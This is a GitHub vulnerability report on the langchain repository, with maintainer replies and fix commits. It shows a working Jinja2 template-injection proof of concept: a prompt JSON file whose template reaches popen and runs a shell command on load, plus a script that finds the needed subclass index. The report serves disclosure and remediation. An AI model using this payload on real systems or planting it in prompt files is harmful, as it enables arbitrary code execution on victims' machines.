
[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Flangchain-ai%2Flangchain%2Fissues%2F4394)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Flangchain-ai%2Flangchain%2Fissues%2F4394)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fissues_fragments%2Fissue_layout&source=header-repo&source_repo=langchain-ai%2Flangchain)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[langchain-ai](/langchain-ai)
/
**[langchain](/langchain-ai/langchain)**
Public

* [Notifications](/login?return_to=%2Flangchain-ai%2Flangchain) You must be signed in to change notification settings
* [Fork
  15.9k](/login?return_to=%2Flangchain-ai%2Flangchain)
* [Star
   98k](/login?return_to=%2Flangchain-ai%2Flangchain)

* [Code](/langchain-ai/langchain)
* [Issues
  382](/langchain-ai/langchain/issues)
* [Pull requests
  45](/langchain-ai/langchain/pulls)
* [Discussions](/langchain-ai/langchain/discussions)
* [Actions](/langchain-ai/langchain/actions)
* [Projects
  2](/langchain-ai/langchain/projects)
* [Security](/langchain-ai/langchain/security)
* [Insights](/langchain-ai/langchain/pulse)

Additional navigation options

* [Code](/langchain-ai/langchain)
* [Issues](/langchain-ai/langchain/issues)
* [Pull requests](/langchain-ai/langchain/pulls)
* [Discussions](/langchain-ai/langchain/discussions)
* [Actions](/langchain-ai/langchain/actions)
* [Projects](/langchain-ai/langchain/projects)
* [Security](/langchain-ai/langchain/security)
* [Insights](/langchain-ai/langchain/pulse)

New issue

**Have a question about this project?** Sign up for a free GitHub account to open an issue and contact its maintainers and the community.

 [Sign up for GitHub](/signup?return_to=%2Flangchain-ai%2Flangchain%2Fissues%2Fnew%2Fchoose)

By clicking “Sign up for GitHub”, you agree to our [terms of service](https://docs.github.com/terms) and
[privacy statement](https://docs.github.com/privacy). We’ll occasionally send you account related emails.

Already on GitHub?
[Sign in](/login?return_to=%2Flangchain-ai%2Flangchain%2Fissues%2Fnew%2Fchoose)
to your account

[Jump to bottom](#issue-comment-box)

# Template injection to arbitrary code execution #4394

Closed

2 of 14 tasks

[r3pwnx](/r3pwnx) opened this issue
May 9, 2023
· 4 comments
 · Fixed by [#10252](https://github.com/langchain-ai/langchain/pull/10252)

Closed

2 of 14 tasks

# [Template injection to arbitrary code execution](#top) #4394

[r3pwnx](/r3pwnx) opened this issue
May 9, 2023
· 4 comments
 · Fixed by [#10252](https://github.com/langchain-ai/langchain/pull/10252)

## Comments

[![@r3pwnx](https://avatars.githubusercontent.com/u/79240390?s=80&v=4)](/r3pwnx)

Copy link

### **[r3pwnx](/r3pwnx)** commented [May 9, 2023](#issue-1701910416) • edited Loading

| System Info windows 11 Who can help? *No response* Information  * The official example notebooks/scripts * My own modified scripts  Related Components  * LLMs/Chat Models * Embedding Models * Prompts / Prompt Templates / Prompt Selectors * Output Parsers * Document Loaders * Vector Stores / Retrievers * Memory * Agents / Agent Executors * Tools / Toolkits * Chains * Callbacks/Tracing * Async  Reproduction  1. save the following data to pt.json  ``` {     "input_variables": [         "prompt"     ],     "output_parser": null,     "partial_variables": {},     "template": "Tell me a {{ prompt }} {{ ''.__class__.__bases__[0].__subclasses__()[147].__init__.__globals__['popen']('dir').read() }}",     "template_format": "jinja2",     "validate_template": true,     "_type": "prompt" }  ```  2. run  ``` from langchain.prompts import load_prompt loaded_prompt = load_prompt("pt.json") loaded_prompt.format(history="", prompt="What is 1 + 1?") ```  3. the `dir` command will be execute   attack scene: Alice can send prompt file to Bob and let Bob to load it. analysis: Jinja2 is used to concat prompts. Template injection will happened note: in the pt.json, the `template` has payload, the index of `__subclasses__` maybe different in other environment. Expected behavior code should not be execute |
| --- |
| The text was updated successfully, but these errors were encountered: |

All reactions

[![@r3pwnx](https://avatars.githubusercontent.com/u/79240390?s=80&v=4)](/r3pwnx)

Copy link

Author

### **[r3pwnx](/r3pwnx)** commented [May 9, 2023](#issuecomment-1540147270)

| The index of "**subclasses** " can be obtained in the following way.  ``` target = 'popen'    num = -1 for i in ''.__class__.__bases__[0].__subclasses__():     num += 1     try:         if target in i.__init__.__globals__.keys():             print(i, num)     except:         pass   ``` |
| --- |

All reactions

Sorry, something went wrong.

[![@dosubot](https://avatars.githubusercontent.com/in/324583?s=80&v=4)](/apps/dosubot)

### This comment was marked as outdated.

[Sign in to view](/login?return_to=https%3A%2F%2Fgithub.com%2Flangchain-ai%2Flangchain%2Fissues%2F4394)

[![@dosubot](https://avatars.githubusercontent.com/in/324583?s=40&v=4)](/apps/dosubot)
[dosubot](/apps/dosubot)
bot
added
the
[stale](/langchain-ai/langchain/labels/stale)
Issue has not had recent activity or appears to be solved. Stale issues will be automatically closed
label
[Aug 29, 2023](#event-10223227449)

[![@obi1kenobi](https://avatars.githubusercontent.com/u/2348618?s=40&u=9cda9b2935a3dafd380af0386a7be1998d7132aa&v=4)](/obi1kenobi)
[obi1kenobi](/obi1kenobi)
removed
the
[stale](/langchain-ai/langchain/labels/stale)
Issue has not had recent activity or appears to be solved. Stale issues will be automatically closed
label
[Aug 29, 2023](#event-10224350941)

[![@obi1kenobi](https://avatars.githubusercontent.com/u/2348618?s=80&u=9cda9b2935a3dafd380af0386a7be1998d7132aa&v=4)](/obi1kenobi)

Copy link

Collaborator

### **[obi1kenobi](/obi1kenobi)** commented [Aug 29, 2023](#issuecomment-1697910136)

| Sorry for the bot reply, it's still a beta and shouldn't be attempting to close security-related issues like this. I'm triaging this right now and should have an update shortly. |
| --- |

All reactions

Sorry, something went wrong.

[![@obi1kenobi](https://avatars.githubusercontent.com/u/2348618?s=80&u=9cda9b2935a3dafd380af0386a7be1998d7132aa&v=4)](/obi1kenobi)

Copy link

Collaborator

### **[obi1kenobi](/obi1kenobi)** commented [Aug 29, 2023](#issuecomment-1697939822)

| Issue confirmed, escalating to `security@langchain.dev`.  Apologies for the delay here. This issue slipped through the cracks, which should not have happened. We're going to use this instance as an internal case study to make sure we do way better in the future.  We've already added a `SECURITY.md` to the repo so that GitHub directs users to send security-related information to `security@langchain.dev` to ensure any security-related issues are promptly acted upon: [#9551](https://github.com/langchain-ai/langchain/pull/9551)  We're also looking at automation to help us detect security-related issues opened on public GitHub, so we can more effectively internally escalate it to `security@langchain.dev` as well. |
| --- |

All reactions

Sorry, something went wrong.

[![@obi1kenobi](https://avatars.githubusercontent.com/u/2348618?s=40&u=9cda9b2935a3dafd380af0386a7be1998d7132aa&v=4)](/obi1kenobi)
[obi1kenobi](/obi1kenobi)
mentioned this issue
[Sep 5, 2023](#ref-pullrequest-1882699963)

[Disable loading jinja2 `PromptTemplate` from file.
#10252](/langchain-ai/langchain/pull/10252)
 Merged

[obi1kenobi](/obi1kenobi)
added a commit
that referenced
this issue
[Sep 5, 2023](#ref-commit-b574d72)
[![@obi1kenobi](https://avatars.githubusercontent.com/u/2348618?s=40&u=9cda9b2935a3dafd380af0386a7be1998d7132aa&v=4)](/obi1kenobi)

`[Disable loading jinja2 PromptTemplate from file.](/langchain-ai/langchain/commit/b574d728366e2cc6ee6a1119c00f9b02126609ad "Disable loading jinja2 `PromptTemplate` from file.

jinja2 templates are not sandboxed and are at risk for arbitrary code
execution. To mitigate this risk:
- We no longer support loading jinja2-formatted prompt template files.
- `PromptTemplate` with jinja2 may still be constructed manually, but
  the class carries a security warning reminding the user to not pass
  untrusted input into it.

Resolves #4394.")`
…

`[b574d72](/langchain-ai/langchain/commit/b574d728366e2cc6ee6a1119c00f9b02126609ad)`

```
jinja2 templates are not sandboxed and are at risk for arbitrary code
execution. To mitigate this risk:
- We no longer support loading jinja2-formatted prompt template files.
- `PromptTemplate` with jinja2 may still be constructed manually, but
  the class carries a security warning reminding the user to not pass
  untrusted input into it.

Resolves [#4394](https://github.com/langchain-ai/langchain/issues/4394).
```

[![@obi1kenobi](https://avatars.githubusercontent.com/u/2348618?s=40&u=9cda9b2935a3dafd380af0386a7be1998d7132aa&v=4)](/obi1kenobi)
[obi1kenobi](/obi1kenobi)
closed this as [completed](/langchain-ai/langchain/issues?q=is%3Aissue+is%3Aclosed+archived%3Afalse+reason%3Acompleted)
in
[#10252](/langchain-ai/langchain/pull/10252)
[Oct 10, 2023](#event-10606067026)

[obi1kenobi](/obi1kenobi)
added a commit
that referenced
this issue
[Oct 10, 2023](#ref-commit-22abeb9)
[![@obi1kenobi](https://avatars.githubusercontent.com/u/2348618?s=40&u=9cda9b2935a3dafd380af0386a7be1998d7132aa&v=4)](/obi1kenobi)

`[Disable loading jinja2](/langchain-ai/langchain/commit/22abeb9f6cc555591bf8e92b5e328e43aa07ff6c "Disable loading jinja2 `PromptTemplate` from file. (#10252)

jinja2 templates are not sandboxed and are at risk for arbitrary code
execution. To mitigate this risk:
- We no longer support loading jinja2-formatted prompt template files.
- `PromptTemplate` with jinja2 may still be constructed manually, but
the class carries a security warning reminding the user to not pass
untrusted input into it.

Resolves #4394.") [PromptTemplate](/langchain-ai/langchain/commit/22abeb9f6cc555591bf8e92b5e328e43aa07ff6c "Disable loading jinja2 `PromptTemplate` from file. (#10252)

jinja2 templates are not sandboxed and are at risk for arbitrary code
execution. To mitigate this risk:
- We no longer support loading jinja2-formatted prompt template files.
- `PromptTemplate` with jinja2 may still be constructed manually, but
the class carries a security warning reminding the user to not pass
untrusted input into it.

Resolves #4394.") [from file. (](/langchain-ai/langchain/commit/22abeb9f6cc555591bf8e92b5e328e43aa07ff6c "Disable loading jinja2 `PromptTemplate` from file. (#10252)

jinja2 templates are not sandboxed and are at risk for arbitrary code
execution. To mitigate this risk:
- We no longer support loading jinja2-formatted prompt template files.
- `PromptTemplate` with jinja2 may still be constructed manually, but
the class carries a security warning reminding the user to not pass
untrusted input into it.

Resolves #4394.")[#10252](https://github.com/langchain-ai/langchain/pull/10252)[)](/langchain-ai/langchain/commit/22abeb9f6cc555591bf8e92b5e328e43aa07ff6c "Disable loading jinja2 `PromptTemplate` from file. (#10252)

jinja2 templates are not sandboxed and are at risk for arbitrary code
execution. To mitigate this risk:
- We no longer support loading jinja2-formatted prompt template files.
- `PromptTemplate` with jinja2 may still be constructed manually, but
the class carries a security warning reminding the user to not pass
untrusted input into it.

Resolves #4394.")`
…

`[22abeb9](/langchain-ai/langchain/commit/22abeb9f6cc555591bf8e92b5e328e43aa07ff6c)`

```
jinja2 templates are not sandboxed and are at risk for arbitrary code
execution. To mitigate this risk:
- We no longer support loading jinja2-formatted prompt template files.
- `PromptTemplate` with jinja2 may still be constructed manually, but
the class carries a security warning reminding the user to not pass
untrusted input into it.

Resolves [#4394](https://github.com/langchain-ai/langchain/issues/4394).
```

[![@aymeric-roucher](https://avatars.githubusercontent.com/u/69208727?s=40&v=4)](/aymeric-roucher)
[aymeric-roucher](/aymeric-roucher)
mentioned this issue
[Dec 6, 2023](#ref-issue-2028344953)

[Specific prompt adds false input variables
#14343](/langchain-ai/langchain/issues/14343)

Closed

14 tasks

[hoanq1811](/hoanq1811)
pushed a commit
to hoanq1811/langchain
that referenced
this issue
[Feb 2, 2024](#ref-commit-1cc216e)
[![@obi1kenobi](https://avatars.githubusercontent.com/u/2348618?s=40&u=9cda9b2935a3dafd380af0386a7be1998d7132aa&v=4)](/obi1kenobi)

`[Disable loading jinja2](/hoanq1811/langchain/commit/1cc216ed5e0ae2fab6bd6f6e5a51d17a5860d8f0 "Disable loading jinja2 `PromptTemplate` from file. (#10252)

jinja2 templates are not sandboxed and are at risk for arbitrary code
execution. To mitigate this risk:
- We no longer support loading jinja2-formatted prompt template files.
- `PromptTemplate` with jinja2 may still be constructed manually, but
the class carries a security warning reminding the user to not pass
untrusted input into it.

Resolves #4394.") [PromptTemplate](/hoanq1811/langchain/commit/1cc216ed5e0ae2fab6bd6f6e5a51d17a5860d8f0 "Disable loading jinja2 `PromptTemplate` from file. (#10252)

jinja2 templates are not sandboxed and are at risk for arbitrary code
execution. To mitigate this risk:
- We no longer support loading jinja2-formatted prompt template files.
- `PromptTemplate` with jinja2 may still be constructed manually, but
the class carries a security warning reminding the user to not pass
untrusted input into it.

Resolves #4394.") [from file. (](/hoanq1811/langchain/commit/1cc216ed5e0ae2fab6bd6f6e5a51d17a5860d8f0 "Disable loading jinja2 `PromptTemplate` from file. (#10252)

jinja2 templates are not sandboxed and are at risk for arbitrary code
execution. To mitigate this risk:
- We no longer support loading jinja2-formatted prompt template files.
- `PromptTemplate` with jinja2 may still be constructed manually, but
the class carries a security warning reminding the user to not pass
untrusted input into it.

Resolves #4394.")[langchain-ai#10252](https://github.com/langchain-ai/langchain/pull/10252)[)](/hoanq1811/langchain/commit/1cc216ed5e0ae2fab6bd6f6e5a51d17a5860d8f0 "Disable loading jinja2 `PromptTemplate` from file. (#10252)

jinja2 templates are not sandboxed and are at risk for arbitrary code
execution. To mitigate this risk:
- We no longer support loading jinja2-formatted prompt template files.
- `PromptTemplate` with jinja2 may still be constructed manually, but
the class carries a security warning reminding the user to not pass
untrusted input into it.

Resolves #4394.")`
…

`[1cc216e](/hoanq1811/langchain/commit/1cc216ed5e0ae2fab6bd6f6e5a51d17a5860d8f0)`

```
jinja2 templates are not sandboxed and are at risk for arbitrary code
execution. To mitigate this risk:
- We no longer support loading jinja2-formatted prompt template files.
- `PromptTemplate` with jinja2 may still be constructed manually, but
the class carries a security warning reminding the user to not pass
untrusted input into it.

Resolves [langchain-ai#4394](https://github.com/langchain-ai/langchain/issues/4394).
```

[Sign up for free](/join?source=comment-repo)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgithub.com%2Flangchain-ai%2Flangchain%2Fissues%2F4394)

Assignees

No one assigned

Labels

None yet

Projects

None yet

Milestone

No milestone

Development

Successfully merging a pull request may close this issue.

 [Disable loading jinja2 `PromptTemplate` from file.](/langchain-ai/langchain/pull/10252)
 [langchain-ai/langchain](/langchain-ai/langchain)

2 participants

[![@obi1kenobi](https://avatars.githubusercontent.com/u/2348618?s=52&v=4)](/obi1kenobi) [![@r3pwnx](https://avatars.githubusercontent.com/u/79240390?s=52&v=4)](/r3pwnx)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.

